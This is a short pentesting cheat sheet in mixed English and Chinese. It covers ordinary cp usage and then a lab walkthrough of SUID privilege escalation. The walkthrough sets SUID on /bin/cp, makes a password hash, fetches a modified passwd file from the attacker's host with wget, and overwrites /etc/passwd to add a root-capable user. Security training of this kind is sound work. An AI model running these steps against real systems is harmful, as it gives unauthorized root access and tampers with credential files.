## cp Privilege Escalation

`cp --help`

### Copy single file to the destination

`cp source.txt destination.txt`

### Copy multiple files to a directory

`cp a b c d.txt demo/`

### Copy source directory to the destination

`cp -R dir1 dir2`

### Interactive prompt

`cp -i demo.txt author`

### Backup a file

`cp -b demo.txt demo_bp.txt`

### Copying using  * wildcard

`cp *.txt folder`

### Force copy

`cp -f test1.txt test2.txt`

### SUID Lab setups for Privilege Escalation [^1]

```bash
which cp
chmod u+s /bin/cp
ls -la /bin/cp
```

### Exploiting SUID

`ssh test@xxx.xxx.x.xx`

`find / -perm -u=s -type f 2>/dev/null` [^2]

`openssl passwd -1 -salt ignite pass123` [^3]

`python -m SimpleHTTPServer`

```bash
# 在本地主机上开启8000端口后，在目标主机上使用 `wget` 下载添加新用户后的 `passwd` 文件
cd /tmp
wget http://192.168.0.16:8000/passwd
```

```bash
# 使用 `cp` 命令，将源文件的内容复制到目标文件
cp passwd /etc/passwd
tail /etc/passwd
```

```bash
su chiya
password: pass123
id
```



[原文](https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/)

---

[^1]: `SUID`：`Set User ID`是一种权限类型，允许用户使用指定用户的权限执行文件。假设我们以非root用户身份访问受害者的计算机，并且我们发现了`suid`位启用的二进制文件，那么这些文件/程序/命令可以使用root权限运行
[^2]: 使用 `find` 命令找出具有 SUID 权限的二进制文件
[^3]: `cp` 命令具有 SUID权限，因此我们尝试通过在 `/etc/passwd`文件中注入新用户来升级到root权限